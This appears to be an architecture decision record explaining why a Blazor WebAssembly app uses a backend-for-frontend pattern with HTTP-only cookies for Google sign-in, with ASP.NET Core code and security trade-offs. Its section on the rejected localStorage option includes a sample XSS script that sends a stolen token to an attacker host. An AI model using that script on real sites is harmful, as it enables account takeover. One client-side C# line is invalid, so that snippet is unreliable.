# ADR-003: Backend-for-Frontend (BFF) Pattern for Authentication

**Status**: Accepted  
**Date**: 2025-11-23  
**Context**: Phase 3 - User Story 1 (Authentication & Profile)

## Context and Problem Statement

We need a secure authentication mechanism for a Blazor WebAssembly app that:
- Authenticates users via Google OAuth
- Protects API endpoints from unauthorized access
- Prevents token theft via XSS attacks
- Works seamlessly with Blazor WASM (SPA architecture)
- Maintains session state across browser refreshes

## Decision Drivers

- **Security**: Prevent XSS attacks from stealing authentication tokens
- **User Experience**: Auto-login on browser refresh (persistent session)
- **Simplicity**: Minimal client-side authentication code
- **OAuth Flow**: Handle Google OAuth callback server-side (redirect-based)
- **API Protection**: Ensure all API endpoints validate authenticated user

## Considered Options

### Option 1: BFF Pattern with HTTP-Only Cookies (Chosen)

**Architecture**:
```
Browser (Blazor WASM)
    ↓ (HTTP-only cookie)
Backend API (ASP.NET Core)
    ↓ (OAuth flow)
Google OAuth
```

**Flow**:
1. User clicks "Sign in with Google" → Redirects to `/api/auth/google`
2. API redirects to Google OAuth consent screen
3. Google redirects back to `/api/auth/google/callback`
4. API exchanges authorization code for Google user info
5. API creates user profile (if new user) and sets HTTP-only cookie
6. API redirects to Blazor app home page
7. Blazor app makes authenticated requests with cookie automatically attached

**Implementation**:
```csharp
// API: Set HTTP-only cookie after OAuth
services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
    .AddCookie(options =>
    {
        options.Cookie.HttpOnly = true;        // XSS protection
        options.Cookie.SecurePolicy = CookieSecurePolicy.Always;  // HTTPS only
        options.Cookie.SameSite = SameSiteMode.Strict;  // CSRF protection
    })
    .AddGoogle(options =>
    {
        options.ClientId = configuration["Authentication:Google:ClientId"];
        options.ClientSecret = configuration["Authentication:Google:ClientSecret"];
    });

// Blazor: No token storage needed - cookie sent automatically
await Http.GetFromJsonAsync<UserProfile>("/api/profile");
```

**Pros**:
- ✅ **XSS Protection**: HTTP-only cookies can't be accessed by JavaScript
- ✅ **CSRF Protection**: SameSite=Strict prevents cross-site requests
- ✅ **Automatic Session**: Cookie persists across browser refreshes
- ✅ **No Client Storage**: No tokens in localStorage or sessionStorage
- ✅ **Simple Client Code**: Blazor makes requests, browser attaches cookie automatically
- ✅ **Server-Side Session**: Backend controls authentication state

**Cons**:
- ⚠️ Requires server-side session management (acceptable - we have ASP.NET Core)
- ⚠️ Not suitable for mobile apps (acceptable - web-only per spec)

### Option 2: OAuth Tokens in LocalStorage (Rejected)

**Architecture**:
```
Browser (Blazor WASM)
    ↓ (OAuth PKCE flow)
Google OAuth
    ↓ (Access token stored in localStorage)
Browser sends token in Authorization header
```

**Pros**:
- ✅ Stateless backend (no session storage)
- ✅ Works for mobile apps (token can be stored in native storage)

**Cons**:
- ❌ **XSS Vulnerability**: Malicious script can read localStorage and steal token
- ❌ **Token Refresh Complexity**: Client must handle token expiration and refresh
- ❌ **No Auto-Login**: Token may expire, requiring re-authentication
- ❌ **PKCE Complexity**: Blazor WASM must implement OAuth PKCE flow client-side

**Security Risk Example**:
```javascript
// Malicious script injected via XSS
const token = localStorage.getItem('auth_token');
fetch('https://attacker.com/steal', { method: 'POST', body: token });
// Attacker now has full access to user's account
```

### Option 3: OAuth Tokens in SessionStorage (Rejected)

**Pros**:
- ✅ Session-scoped (cleared when browser closes)

**Cons**:
- ❌ **XSS Vulnerability**: Still accessible via JavaScript
- ❌ **Lost on Refresh**: User must re-authenticate on page refresh (poor UX)
- ❌ Same token refresh complexity as Option 2

### Option 4: OAuth Tokens in Memory Only (Rejected)

**Pros**:
- ✅ Not accessible via XSS after initial load

**Cons**:
- ❌ **Lost on Refresh**: User must re-authenticate on every page refresh (terrible UX)
- ❌ **Lost on Navigation**: Token lost when user navigates away and back
- ❌ Unacceptable for a productivity app (users expect persistent sessions)

## Decision Outcome

**Chosen**: BFF Pattern with HTTP-Only Cookies (Option 1)

### Implementation Details

**Server-Side (ASP.NET Core API)**:

```csharp
// GoogleAuthEndpoints.cs
public static class GoogleAuthEndpoints
{
    public static IEndpointRouteBuilder MapGoogleAuthEndpoints(this IEndpointRouteBuilder app)
    {
        app.MapGet("/api/auth/google", () =>
        {
            var properties = new AuthenticationProperties
            {
                RedirectUri = "/api/auth/google/callback"
            };
            return Results.Challenge(properties, new[] { GoogleDefaults.AuthenticationScheme });
        });

        app.MapGet("/api/auth/google/callback", async (HttpContext context) =>
        {
            var result = await context.AuthenticateAsync(CookieAuthenticationDefaults.AuthenticationScheme);
            if (!result.Succeeded)
                return Results.Redirect("/auth?error=auth_failed");

            // HTTP-only cookie is already set by ASP.NET Core authentication
            return Results.Redirect("/");  // Redirect to Blazor app home
        });

        app.MapGet("/api/auth/me", (ClaimsPrincipal user) =>
        {
            if (!user.Identity?.IsAuthenticated ?? false)
                return Results.Unauthorized();

            var googleId = user.FindFirst(ClaimTypes.NameIdentifier)?.Value;
            var email = user.FindFirst(ClaimTypes.Email)?.Value;
            return Results.Ok(new { GoogleId = googleId, Email = email });
        })
        .RequireAuthorization();

        app.MapPost("/api/auth/signout", async (HttpContext context) =>
        {
            await context.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);
            return Results.Redirect("/auth");
        });

        return app;
    }
}
```

**Client-Side (Blazor WASM)**:

```razor
<!-- Auth.razor -->
<h1>PoOmad</h1>
<RadzenButton Text="Sign in with Google" Click="@SignIn" />

@code {
    private void SignIn()
    {
        // Redirect to API OAuth endpoint
        NavigationManager.NavigateTo("/api/auth/google", forceLoad: true);
    }
}
```

```csharp
// ApiClient.cs
public class ApiClient
{
    private readonly HttpClient _http;

    public ApiClient(HttpClient http)
    {
        _http = http;
        _http.DefaultRequestOptions.Credentials = new FetchCredentialsRequestMode.Include;
        // Ensures cookies are sent with every request
    }

    public async Task<T?> GetAsync<T>(string url)
    {
        return await _http.GetFromJsonAsync<T>(url);
        // Cookie is automatically attached by browser
    }
}
```

### Justification

1. **XSS Protection**: HTTP-only cookies can't be accessed by malicious scripts
2. **CSRF Protection**: SameSite=Strict prevents cross-site request forgery
3. **Auto-Login**: Cookie persists → user stays logged in after browser refresh
4. **Simple Client Code**: No token management in Blazor app
5. **OAuth Handled Server-Side**: API exchanges authorization code (never exposed to client)

### Security Guarantees

| Attack Vector | Mitigation |
|---------------|------------|
| XSS (Script injection) | HTTP-only cookie can't be read by JavaScript |
| CSRF (Cross-site requests) | SameSite=Strict blocks cross-origin requests |
| Token Theft | Token never exists in client-side code |
| Man-in-the-Middle | Secure=true requires HTTPS |
| Session Fixation | New cookie generated on each login |

## Consequences

### Positive

- **User Experience**: Auto-login on browser refresh
- **Security**: Best protection against XSS and CSRF
- **Simplicity**: Blazor components don't manage authentication state
- **Auditability**: Server-side session logs all authentication events

### Negative

- **Server State**: Must maintain session storage (minimal overhead with ASP.NET Core)
- **Not for Mobile Apps**: HTTP-only cookies don't work in native mobile apps
  - **Mitigation**: Spec is web-only, no mobile requirement
- **CORS Complexity**: Must configure CORS to allow credentials
  - **Mitigation**: API and client are same-origin in Aspire setup

## Validation

**Security Checklist**:
- ✅ HTTP-only cookie prevents XSS token theft
- ✅ SameSite=Strict prevents CSRF attacks
- ✅ Secure=true enforces HTTPS (prod only, Aspire handles this)
- ✅ Google OAuth scopes limited to profile + email only
- ✅ No tokens stored in browser storage (localStorage, sessionStorage)

**User Experience**:
- ✅ User clicks "Sign in with Google" → OAuth flow → Redirected to dashboard
- ✅ User refreshes browser → Still logged in (cookie persists)
- ✅ User closes browser → Cookie expires after 14 days (configurable)

## Comparison to Industry Standards

| App | Auth Pattern | Reason |
|-----|-------------|---------|
| GitHub | BFF with cookies | Same reasoning - web SPA security |
| Gmail | OAuth + Cookies | Same reasoning - XSS protection |
| Azure Portal | BFF with cookies | Microsoft's own recommendation for SPAs |
| **PoOmad** | **BFF with cookies** | Aligned with industry best practices |

## References

- [OWASP: XSS Prevention](https://owasp.org/www-community/attacks/xss/)
- [OWASP: CSRF Prevention](https://owasp.org/www-community/attacks/csrf)
- [Microsoft: Secure ASP.NET Core Blazor WebAssembly](https://learn.microsoft.com/aspnet/core/blazor/security/webassembly/)
- [Auth0: Token Storage Best Practices](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)
- [Google OAuth Documentation](https://developers.google.com/identity/protocols/oauth2)

## Related Decisions

- **Phase 3 Tasks**: T038-T039 implement Google OAuth and cookie authentication
- **FR-001**: Google account authentication requirement
- **FR-021**: Sign-out functionality with cookie clearing
